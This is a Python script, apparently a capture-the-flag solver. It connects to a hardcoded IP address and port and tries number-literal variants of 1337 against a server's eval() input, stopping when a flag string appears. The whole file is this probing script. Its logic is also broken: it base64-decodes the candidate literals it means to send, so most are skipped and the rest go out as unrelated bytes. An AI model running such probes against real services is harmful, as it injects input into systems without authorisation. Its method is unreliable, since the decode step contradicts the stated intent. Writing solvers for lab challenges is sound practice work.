#!/usr/bin/env python3
# try_literals.py
import socket, base64, time

HOST = "20.102.93.39"
PORT = 33472
TIMEOUT = 3.0

# Lista de literais possíveis (as bytes) que o eval() do servidor pode aceitar
CANDIDATES = [
    b'1337',
    b' 1337',
    b'\t1337',
    b'1337\n',
    b'0x539',        # hex
    b'0o2471',       # octal
    b'0b10100111001',# binary
    b'int(1337)',
    b'int("1337")',
    b'1337 #',       # comentário depois
    b'(1337)',
    b'+1337',
    b'1337.0',       # float (eval->1337.0 not equal int but we'll still inspect)
    # se quiser adicione mais formas aqui
]

def recv_all(sock, timeout=2.0):
    sock.settimeout(0.5)
    data = b''
    t0 = time.time()
    while True:
        if time.time() - t0 > timeout:
            break
        try:
            part = sock.recv(4096)
        except socket.timeout:
            continue
        except Exception:
            break
        if not part:
            break
        data += part
    return data

def try_candidate(candidate):
    try:
        payload = base64.b64decode(candidate, validate=True)
    except Exception as e:
        print(f"[SKIP] candidate {candidate!r} is not valid base64 -> {e}")
        return

    print("="*60)
    print("candidate:", candidate)
    print("payload repr:", repr(payload))
    print("payload hex :", payload.hex())
    for newline_name, newline in (("LF", b"\n"), ("CRLF", b"\r\n")):
        print(f"-- trying newline={newline_name} --")
        try:
            with socket.create_connection((HOST, PORT), timeout=8) as s:
                # try to receive banner (non-blocking short)
                banner = recv_all(s, timeout=0.8)
                if banner:
                    try:
                        print("banner:", banner.decode('utf-8', errors='replace'))
                    except Exception:
                        print("banner repr:", repr(banner))
                # send raw bytes + newline
                s.sendall(payload + newline)
                # read response
                resp = recv_all(s, timeout=TIMEOUT)
                if resp:
                    print("response (utf-8 replace):")
                    try:
                        print(resp.decode('utf-8', errors='replace'))
                    except Exception:
                        print(repr(resp))
                    print("response repr:", repr(resp))
                    # heurística simples: if "IDP{" or "flag" appears, stop early
                    text = ""
                    try:
                        text = resp.decode('utf-8', errors='ignore')
                    except Exception:
                        pass
                    if "IDP{" in text or "flag" in text.lower():
                        print(">>> Looks like a flag or IDP{ found! stopping further tries.")
                        return True
                else:
                    print("no response (or empty).")
        except Exception as e:
            print("socket error:", e)
    return False

def main():
    print("Will try", len(CANDIDATES), "candidates against", HOST, PORT)
    for c in CANDIDATES:
        found = try_candidate(c)
        if found:
            break
    print("done.")

if __name__ == "__main__":
    main()

